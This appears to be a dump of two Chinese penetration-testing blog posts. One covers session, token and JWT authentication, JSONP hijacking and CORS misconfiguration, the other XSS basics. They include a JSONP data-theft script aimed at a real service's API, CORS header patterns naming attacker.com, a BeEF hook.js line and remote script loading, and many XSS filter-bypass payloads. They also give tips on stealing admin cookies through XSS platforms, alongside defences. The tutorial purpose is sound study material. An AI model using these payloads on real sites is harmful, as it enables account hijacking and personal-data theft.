返回给浏览器 浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名 当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。 根据以上流程可知，SessionID 是连接 Cookie 和 Session 的一道桥梁，大部分系统也是根据此原理来验证用户登录状态。由于关闭浏览器不会导致 session 被删除，迫使服务器为 session 设置了一个失效时间，当距离客户端上一次使用 session 的时间超过这个失效时间时，服务器就认为客户端已经停止了活动，才会把 session 删除以节省存储空间。 TOKEN 访问资源接口（API）时所需要的资源凭证 简单 token 的组成： uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串） 特点： 服务端无状态化、可扩展性好 支持移动端设备 安全 支持跨程序调用 token 的身份验证流程： 客户端使用用户名跟密码请求登录 服务端收到请求，去验证用户名与密码 验证成功后，服务端会签发一个 token 并把这个 token 发送给客户端 客户端收到 token 以后，会把它存储起来，比如放在 cookie 里或者 localStorage 里 客户端每次向服务端请求资源的时候需要带着服务端签发的 token 服务端收到请求，然后去验证客户端请求里面带着的 token ，如果验证成功，就向客户端返回请求的数据 特点： 每一次请求都需要携带 token，需要把 token 放到 HTTP 的 Header 里 基于 token 的用户认证是一种服务端无状态的认证方式，服务端不用存放 token 数据。用解析 token 的计算时间换取 session 的存储空间，从而减轻服务器的压力，减少频繁的查询数据库 token 完全由应用管理，所以它可以避开同源策略 JWT JSON Web Token（简称 JWT）是目前最流行的跨域认证解决方案。 是一种认证授权机制。 JWT 是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准（RFC 7519）。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用在用户登录上。 可以使用 HMAC 算法或者是 RSA 的公/私秘钥对 JWT 进行签名。因为数字签名的存在，这些传递的信息是可信的。 JWT 认证流程： 用户输入用户名/密码登录，服务端认证成功后，会返回给客户端一个 JWT 客户端将 token 保存到本地（通常使用 localstorage，也可以使用 cookie） 当用户希望访问一个受保护的路由或者资源的时候，需要请求头的 Authorization 字段中使用Bearer 模式添加 JWT，其内容看起来是下面这样Authorization: Bearer &lt;token&gt; 服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为 因为 JWT 是自包含的（内部包含了一些会话信息），因此减少了需要查询数据库的需要 因为 JWT 并不使用 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS） 因为用户的状态不再存储在服务端的内存中，所以这是一种无状态的认证机制 JWT 的使用方式 客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。 方式一 当用户希望访问一个受保护的路由或者资源的时候，可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求头信息的 Authorization 字段里，使用 Bearer 模式添加 JWT。 123GET /calendar/v1/eventsHost: api.example.comAuthorization: Bearer &lt;token&gt; 用户的状态不会存储在服务端的内存中，这是一种 无状态的认证机制 服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为。 由于 JWT 是自包含的，因此减少了需要查询数据库的需要 JWT 的这些特性使得我们可以完全依赖其无状态的特性提供数据 API 服务，甚至是创建一个下载流服务。 因为 JWT 并不使用 Cookie ，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS） 方式二 跨域的时候，可以把 JWT 放在 POST 请求的数据体里。 方式三 通过 URL 传输：http://www.example.com/user?token=xxx 常见的前后端鉴权方式 Session-Cookie Token 验证（包括 JWT，SSO单点登录认证） OAuth2.0（开放授权） Cookie 、Session和Token的对比 属性 Cookie Session Token（JWT） 安全性 差 - 好（不会有CORS劫持） 存储方式 由浏览器存储 由服务器存储 由应用管理 存储大小 小（且时间长） 理论无限大（时间短） - 功能差异 1. 移动端支持差；2. 无法跨域 - 1. 移动端支持好 实现方式 存储与比对，会存储会话信息 存储与比对，会存储会话信息 直接解析比对，不依赖cookie，不会存储会话信息 同源策略 所谓的同源就是：协议+主机（域名）+端口都相同，一般来说，主机协议不一样，那么端口就不一样，就像http 80 https 443一样。 主要用来防止跨源操作，例如，读和写。 但是我们有时候需要引入外部资源，这个同源一棒子全部打死，咋办？ 这时候有两种解决方式一个是JSONP，一个是CORS： 一个是通过src标签属性来绕过检查 一个是通过双方验证允许的列表，来保证导入的数据是好的 他们分别会导致不同的劫持。 同源判断示例：URL地址 http://www.example.com/dir/page.html Compared URL Outcome Reason http://www.example.com/dir/page2.html Success Same protocol, host and port http://www.example.com/dir2/other.html Success Same protocol, host and port http://domain-ip/dir/page2.html Failure Different host (exact match required) http://username:password@www.example.com/dir2/other.html Success Same protocol, host and port http://www.example.com:81/dir/other.html Failure Same protocol and host but different port https://www.example.com/dir/other.html Failure Different protocol http://en.example.com/dir/other.html Failure Different host http://example.com/dir/other.html Failure Different host (exact match required) http://v2.www.example.com/dir/other.html Failure Different host (exact match required) http://www.example.com:80/dir/other.html Depends Port explicit. Depends on implementation in browser JSONP——填充式 JSON JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。JSONP实现跨域请求的原理简单的说，就是动态创建&lt;script&gt;标签，然后利用&lt;script&gt;的src 不受同源策略约束来跨域获取数据。JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性。 JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。 动态创建&lt;script&gt;标签，设置其src，回调函数在src中设置： 123var script = document.createElement(&quot;script&quot;);script.src = &quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;;document.body.insertBefore(script, document.body.firstChild); 在页面中，返回的JSON作为response参数传入回调函数中，我们通过回调函数来来操作数据。 123function handleResponse(response)&#123; // 对response数据进行操作代码&#125; 劫持 那么劫持又是怎么回事呢？其实我们在学安全的过程中对劫持这个词可以说是一点也不陌生，我们遇到过很多的劫持的攻击方法，比如：dns 劫持、点击劫持、cookie劫持等等，也正如劫持这个词的含义：“拦截挟持”，dns 劫持就是把 dns 的解析截获然后篡改，点击劫持就是截获你的鼠标的点击动作，在用户不知情的情况下点击攻击者指定的东西，cookie 劫持就是获取用户的 cookie，然后可以进一步伪造身份，那么同样， jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据。 劫持利用过程 通过JSONP技术可以实现数据的跨域访问，必然会产生安全问题。 如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞能够获取用户在网站B上的数据。 用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息； 用户通过浏览器向网站A发出URL请求； 网站A向用户返回响应页面，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下： 1234567&lt;script type=&quot;text/javascript&quot;&gt;function Callback(result)&#123; alert(result.name);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt; 用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求； 网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下： 1Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;)。 网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。 实例： 攻击者通过巧妙设计一个网站，网站中包含其他网站的JSONP漏洞利用代码，将链接通过邮件等形式推送给受害人，**如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，**这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。 挖掘思路 这里我采用chrome浏览器的调试窗口进行挖掘weibo.com中存在的漏洞(测试之前需要登录一下，因为我们需要检测是不是会有敏感信息泄露) 首先把Preserve log选项勾上，这样用来防止页面刷新跳转的时候访问记录被重置，也方便我们进行下一步的筛选。 然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 callback json jsonp email 然后我们需要人工确认这个请求的返回值是否有泄露用户的敏感信息，并且能被不同的域的页面去请求获取，这里以上面查找到的 jsonp 为例，发现换成了别的浏览器还是能检测到，说明验证的来源有些问题 自动化查找 自动化测试工具Selenium + Proxy + 验证脚本 Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口； Proxy：用于代理所有的请求，过滤出所有包含敏感信息的JSONP请求，并记录下HTTP请求； 验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！ 利用 JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作(水坑攻击)，下面的一个例子就可以说是在模拟水坑攻击 当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上 12345678910111213141516$.ajax(&#123; url: &#x27;https://api.weibo.com/2/&#123;隐藏了哦&#125;&#x27;, type: &#x27;get&#x27;, dataType: &#x27;jsonp&#x27;,&#125;).done(function(json)&#123; var id = json[&quot;data&quot;][&quot;id&quot;]; var screen_name = json[&quot;data&quot;][&quot;screen_name&quot;]; var profile_image_url = json[&quot;data&quot;][&quot;profile_image_url&quot;]; var post_data = &quot;&quot;; post_data += &quot;id=&quot; + id + &quot;&amp;amp;&quot;; post_data += &quot;screen_name=&quot; + screen_name + &quot;&amp;amp;&quot;; post_data += &quot;profile_image_url=&quot; + encodeURIComponent(profile_image_url); console.log(post_data); // 发送到我的服务器上&#125;).fail(function() &#123;&#125;); 利用代码：https://github.com/qiaofei32/jsonp_info_leak 防护 严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。 严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。 严格过滤 callback 函数名及 JSON 里数据的输出。 严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。 其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。 CORS——跨来源资源共享 CORS（Cross-Origin Resource Sharing 跨来源资源共享），CORS允许浏览器向跨域服务器发出XmlHttpRequest请求，CORS与JSONP的区别：是JSONP的升级版，JSONP只能通过get方式请求，CORS支持get和post请求。 CORS跨域原理：向header中注入Access-Control-Allow-Origin服务端过判断请求头中的参数是否被允许的域来决定请求源是否有权限获取数据。如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。 字段 Access-Control-Allow-Origin：该字段是必须存在的，它的值可能是 Origin 字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大； Access-Control-Allow-Credentials 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。但需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略， 只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。 简单流程 这个响应头表示访问允许，*符号表示所有的请求源的所有形式的请求，都被允许访问数据，这样也就造成了一个跨域读取敏感信息的漏洞。 改为百度成功,假如我改成自己服务器上的话,是不是在本机就能读取到别人的敏感信息呢? 如何快速判断是否存在CORS漏洞 1234567891011121314最好的攻击案例：Access-Control-Allow-Origin: https://attacker.comAccess-Control-Allow-Credentials: true可能存在利用点：Access-Control-Allow-Origin: nullAccess-Control-Allow-Credentials: true配置失误，但是几乎无法利用：Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true或者只有一个：Access-Control-Allow-Origin: * 修复建议： 加强对access-control-allow-orign的控制； 另外提一下大平台很喜欢利用cors跨域读取资源，多多使用f12打法有奇效。总的来说jsonp劫持和cors跨域都是属于csrf漏洞的一种,需要诱骗受害者点击才能触发,就是返回信息的接口被攻击者调用了 返回了敏感数据给其他人。 检测 CORS 漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。 一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。 首先是自动在 HTTP 请求包中加上 Origin 的头部字段，打开BurpSuite，选择 Proxy 模块中的 Options 选项，找到 Match and Replace 这一栏，勾选 Request header 将空替换为 Origin:foo.example.org 的Enable框： 然后我们就可以开始去访问我们认为有漏洞的网站，访问足够多后在 BurpSuite 的 Proxy 模块下的 HTTP history 来筛选带有 CORS 头部的值： 条件可以是： 12Access-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true 这里要注意的是，我们也可以测试下带有 CORS 字段的网站是否有 CORS 漏洞，如果服务器响应包的请求头是以下几种情况则可存在 CORS 漏洞 一定有： 1234Access-Control-Allow-Origin: *或Access-Control-Allow-Origin: https://attacker.comAccess-Control-Allow-Credentials: true 可能：（同时出现） 12Access-Control-Allow-Origin: nullAccess-Control-Allow-Credentials: true 没有：(浏览器会自动截至) 12Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true 有时候 CORS 配置了信任自身的任意子域，那么如果一个子域存在 XSS 漏洞就可以通过这个漏洞去读取其他子域的资源，类似的场景还有比如 HTTPS 域信任 HTTP 域等。 工具 https://github.com/chenjj/CORScanner。 详细说明+payload https://github.com/AI0TSec/blog/issues/9 防护 关闭不必要开启的CORS； 白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置 Access-Control-Allow-Origin 为通配符 * 或 null ，严格效验来自请求数据包中的 Origin 的值； 仅允许使用安全协议，避免中间人攻击； 尽可能的返回 Vary: Origin 头部，以避免攻击者利用浏览器缓存进行攻击； 避免将 Access-Control-Allow-Credentials 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false； 限制跨域请求允许的方法，Access-Control-Allow-Methods 最大限度地减少所涉及的方法，降低风险； 限制浏览器缓存期限：建议通过 Access-Control-Allow-Methods 和 Access-Control-Allow-Headers 头部，限制浏览器缓存信息的时间。通过配置 Access-Control-Max-Age 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略； 仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://j3f5.github.io/tags/CSRF/"},{"name":"劫持","slug":"劫持","permalink":"https://j3f5.github.io/tags/%E5%8A%AB%E6%8C%81/"},{"name":"跨域","slug":"跨域","permalink":"https://j3f5.github.io/tags/%E8%B7%A8%E5%9F%9F/"}]},{"title":"XSS跨站基础","slug":"XSS跨站基础","date":"2023-05-30T08:40:42.000Z","updated":"2023-06-01T03:09:45.000Z","comments":true,"path":"articles/2023/05/30/XSS跨站基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/","excerpt":"","text":"XSS跨站基础 原理 恶意攻击者在web页面中会插入一些恶意的javascript代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。 层面：一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果 函数：比如说php中的脚本的输出函数：常见的输出函数有：print、print_r、echo、printf、sprintf、die、var_dump、var_export 危害影响 攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。 网络钓鱼，包括获取各类用户账号； 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等； 强制弹出广告页面、刷流量等； 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如ddos等； 获取客户端信息，如用户的浏览历史、真实ip、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf,实施进一步危害； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等 注意：浏览器的内核会影响攻击的产生（会阻止），所以，XSS的危害会受到很多因素的影响。 攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址 出现位置 文章发表、评论、留言、注册资料、修改资料等地方 什么位置是有用的？ 一般XSS漏洞，厂家是不收的，因为有很多的限制条件，但是我们如果在订单发布等地方发现了XSS存储型漏洞，那么这个漏洞是很有价值的。因为管理员会经常访问订单页面查看，不需要我们去发链接给他触发。 重点位置： 留言板 评论区 订单系统 反馈信息 测试手法 盲打，直接冲，乱甩payload。注意，这个位置必须是上面的位置！ 攻击类型分类 反射型：发包 =&gt; x.php =&gt; 回包 存储型：发包 =&gt; x.php =&gt; 数据库 =&gt; 回包 DOM型：发包 =&gt; 本地浏览器静态前端代码 =&gt; x.php 反射型 反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。是需要点击才能攻击。 场景：攻击者发送一个带有恶意连接的邮件给受害者，受害者点击。 存储型 存储型XSS时常伴随着SQL注入。它的特征是，XSS攻击Payload是被写到数据库里面了。是持续性的攻击。 场景：受害者正常访问网页，网页会执行XSS脚本。 DOM型 在翻页的时候，有两种：一种是点击第二页，然后跳转，另一种是点击展示更多，然后加载。前者是与PHP等后端语言打交道，然后生成页面。后者是与HTML打交道，然后重新构造DOM（插入），生成更多的视图。 而JS可以操作HTML DOM结点！ 官方解释： 基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。 用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。 如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;DOM XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; var pos=document.URL.indexOf(&quot;name=&quot;)+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length)));&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 从代码层面看，漏洞形成原因很简单，document.URL获取用户输入，在代码中未经过任何过滤就传递给了document.write输出到当前页面中。 当我们正常输入name值时页面直接显示输入的内容，F12查看DOM文档可看到输入的内容确实是插入到当前DOM结构中： 也就是说DOM结构我们用户输入可控，当我们输入XSS payload时就会弹框，造成DOM型XSS。 从挖洞角度看，任何漏洞都是从外部输入加上危险的操作导致的，这里DOM型XSS也不例外。 DOM型XSS中，其外部输入是JS中存在获取外部输入内容的可利用的代码如URL栏内容的location.href，然后该外部输入内容在未经过有效过滤的情况下就传入危险的输出函数直接输出到页面中或传入eval等危险执行函数就会在页面上直接解析恶意JS代码，导致DOM型XSS的存在。 参考链接：https://www.mi1k7ea.com/2019/06/25/浅析DOM型XSS/ 下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。具体见附录。 实际攻击示例 发现订单页面： 登录XSS平台，复制他给的PAYLOAD 注入之后，等到管理员打开订单系统查看信息，那么就会出发漏洞，我们可以从XSS平台上获得相关信息，例如cookie 获得COOKIE后使用Postman构造包，模拟发送接收，重现登录到后台系统的操作。 注：也可以自己写代码接收数据。自己构建XSS平台。 手法 XSS平台的使用 平台有很多，直接上网搜“XSS”平台即可。还有著名的Beef平台。 xssaq.com 上面说过简单的利用。大致都是复制平台上的Payload，放到可能有xss注入的地方。然后再平台上进行相关操作。 XSS工具的使用 beef-xss，就是复制他给的攻击Payload，直接冲就完事了。然后他通过hook.js实现对网站的攻击。可以实现跳转啊之类的。 1&lt;script src=&quot;http://IP:3000/hook.js&quot;&gt;&lt;/script&gt; IP地址扫描 结合JBoss攻击… 实际上他是 禁止加载外域的代码。 XSS结合其他漏洞 绕过 代码过滤 测试是否存在过滤 输入asdf&lt;'&quot;=&gt;asdf 这个有没有被过滤。如果看源码这个都没有转码成&amp;gt;&amp;lt;啥的，就很可能存在XSS漏洞。 因为存在&lt;&gt;与单引号这一类字符，所以HTML不正确，会一直呆在那个页面，而如果正确，则会到成功页面。那时候我们基于这个网址构造的payload就没用了。所以在调试的时候必须让这个页面处于原页面，不让他转。 如果过滤了&lt;&gt;和&quot;，那么可以使用onFocus=‘来完成攻击。 常用的攻击和测试函数： alert eval fromCharCode onChange onFocus &lt;.\\*?&gt; 代码绕过 双写绕过、大小写绕过 伪协议绕过：javascript:alert(1);。注：Javascript:伪协议后面可以使用URL编码。 &lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt; &lt;IMG SRC=javascript:alert('XSS')&gt; 利用标签属性： script：&lt;script&gt;alert('1')&lt;/script&gt; &lt;a href=&gt;：&quot;&gt; &lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;（新造一个标签，可以大小写绕过） &lt;img&gt;：&lt;img src=11 onerror=alert(1)&gt; 利用事件： onclick：onclick=alert(1) onfocus：onfocus=javascript:alert(1) onerror：onerror=alert(1)。onerror里的内容是当js解析的,因此可以用JSunicode编码,但是不能全部编码只能编码函数名。如果全部编码是会出错的。onerror支持：html10,html16，jsunicode,不支持js8进制和js16进制 onmouseover：（表示当鼠标移动到该标签上时就会触发执行某项动作）。 利用远程加载： 123&lt;script&gt;$.getScript(&quot;http://raw.githubsercontent.com/GrayHatHacking/GHHv5/master/ch16/test.js&quot;, function()&#123; hack(); &#125;); //&lt;/script&gt; 利用编码： 使用Unicode编码js代码（转码网站）： 注意事项：只有在标签内的script代码才能编码，首先经过unicode编码，然后再去url编码那里，编码后才算完成！ &lt;a href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(1)&gt;Click&lt;/a&gt; URL编码 &lt;a href=javascript:%2561%256c%2565%2572%2574%2528%2531%2529&gt;Click&lt;/a&gt; HTML实体编码 123456空格 &amp;nbsp; &amp;#160; &amp;#x20;&lt; &amp;lt; &amp;#60; &amp;#x3c;&gt; &amp;gt; &amp;#62; &amp;#x3e;&amp; &amp;amp; &amp;#38; &amp;#x26;&quot; &amp;quot; &amp;#34; &amp;#x22;&#x27; &amp;apos; (IE不支持) &amp;#39; &amp;#x27; 第二个就是十进制实体编码，使用&amp;开头； 1&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt; 第三个就是十六进制实体编码，使用&amp;#x开头，后面的数字跟URL编码是一样的。 需要注意的是，他需要;才能工作。例如&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt; 以上三种编码是可以组合起来的：Unicode URL HTML JavaScript编码 三个八进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\\074” 两个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\\x3c” 四个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\\u003c” 对于一些控制字符，使用特殊的C类型的转义风格（例如\\n和\\r） 在javascript伪协议中可以用（javascript中只识别几种编码：Jsunicode js8进制 js16进制）。 base64编码 在Data协议的时候使用 遇到如下标签： &lt;a href=&quot;可控&quot;&gt; &lt;iframe src=&quot;可控&quot;&gt; &lt;object data=“可控&quot;&gt; 这个时候如果过滤了&lt;&gt;'&quot;JavaScript的话，则可以使用&lt;img src=x οnerrοr=alert(1)&gt;编码成：PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==，然后使用data协议代入可控点： 1&lt;a href=“data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”&gt;111&lt;/a&gt; 请求头注入：如referer和user-agent等等，都是可以利用的。只要它把这些值放到网页上，就可以利用！ 字符绕过： 空格：换行符%0a。换行时必须用单双引号围住，否则不会跳过。跳过回车和换行,不支持on事件 /：这个时候就不能用闭合标签了，可以使用非闭合的标签如img和a 引用外部资源，即src。 HttpOnly禁止读Cookie httponly：如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本读取到该 cookie 的信息，但还可以在 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全。虽然设置了httponly之后拿不到cookie，但是还是存在xss跨站语句，阻止的仅仅是获取cookie。 下面是设置HTTP-only cookie的一个报头的示例： 1Set-Cookie: USER=123; expires=Wednesday, 09-Nov-99 23:12:40 GMT; HttpOnly 绕过： 浏览器未保存帐号密码：需要 xss 产生登录地址（漏洞产生在登录界面），利用表单劫持 设置XSS平台的时候选择：获得对应输入框的明文账号密码，然后去看源码中输入框的type和name之类的参数，设置好就可以传这个XSSpayload进去。 浏览器保存帐号密码：浏览器读取帐号密码 WAF拦截与绕过 标签语法替换 提交方式更改，GET/POST 垃圾数据溢出 加密解密算法 结合其他漏洞绕过 其他 WEBSHELL盒子 有webshell中的webshell，当你利用他的大马传入到一个受害主机上，那么一旦你运行该马，那么这个马就会自动传受害者主机地址，利用的账号密码到他提前设置好的主机上。这样子，写这个马的人就 坐收渔翁之利 ！ 他一般会有一些代码，里面写了什么服务器信息啥的，可以仔细看看，但是他如果一旦混淆了，你就看不到了。 如何探测这个是不是有后门？ 看一下有没有莫名其妙的数据包（用F12），抓包也行。在数据包有没有向外发送数据包，有个莫名其妙的你不懂的IP地址/URL 那么如何反杀？我们可以传一个存储型XSS进去，链上我们的XSS平台，进行黑吃黑吃黑！ 资源 http://xss.fbisb.com/ https://github.com/tennc/webshell https://www.postman.com/downloads/ https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA 提取码：xiao https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw 提取码：xiao Cookie与Session对于XSS的影响 小迪说：如果对方使用session验证，那么我们的xss平台是抓不到它的session的，因为session是存储在服务器的。 **实战webgoat测试：**http://127.0.0.1:8080/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/6 在传入我们的XSS平台代码时，是可以接收到他的JSESSION的！ 但是怎么利用呢？暂时不知道，经过BURP抓包发现他访问上面的网址会经过各种mvc，例如WebGoat/service/lessonoverview.mvc 之类的，最终到达/WebGoat/start.mvc，/WebGoat/service/lessonmenu.mvc，…，lesson 修复方案 开启 httponly,输入过滤，输出过滤等 PHP:http://www.zuimoge.com/212.html JAVA:https://www.cnblogs.com/baixiansheng/p/9001522.html 使用ESAPI，首先应当配置过滤器；其次将过滤器注册到web.xml文件中；最后配置Request的包装类 附录 资源 https://xss8.cc/xss.php?do=login https://xsshs.cn/xss.php?do=login https://github.com/do0dl3/xss-labs http://down.chinaz.com/soft/37581.htm 工具： 自动化工具：https://github.com/s0md3v/XSStrike 参考 绕过：https://www.ddosi.org/xss-bypass/#绕过WAF的方法——跨站脚本 绕过：https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html DOM型XSS漏洞挖掘——trick函数 Sources document.URL document.URLUnencoded document.location（及其许多属性） document.referrer window.location（及其许多属性） location location.href location.search location.hash location.pathname Sinks 直接执行脚本类 eval(…) window.execScript(…) window.setInterval(…) window.setTimeout(…) 写HTML页面类 document.write(…) document.writeln(…) element.innerHTML(…) 直接修改DOM类 